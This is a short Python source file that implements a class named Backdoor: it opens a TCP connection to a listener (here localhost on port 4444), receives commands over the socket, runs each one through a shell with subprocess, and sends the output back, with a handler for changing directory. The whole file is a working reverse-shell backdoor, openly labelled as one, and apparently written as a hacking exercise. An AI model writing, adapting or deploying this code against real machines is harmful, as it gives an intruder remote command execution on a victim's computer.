import socket
import subprocess
from subprocess import Popen,PIPE
import os

class Backdoor:
    def __init__(self):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect(("localhost",4444))

    def execute_command(self,command):
        return subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)


    def run(self):
        while True:
            	command = self.connection.recv(1024)
            	res = self.execute_command(command)
            	self.connection.send(res.stdout.read() + res.stderr.read())
            	if command[:2] == "cd":
                	os.chdir(command[3:])
                	self.connection.send("[+]Changing working directory to: {}".format(os.getcwd()))
   

def main():
    B = Backdoor()
    B.run()  

if __name__=="__main__":
    main() 
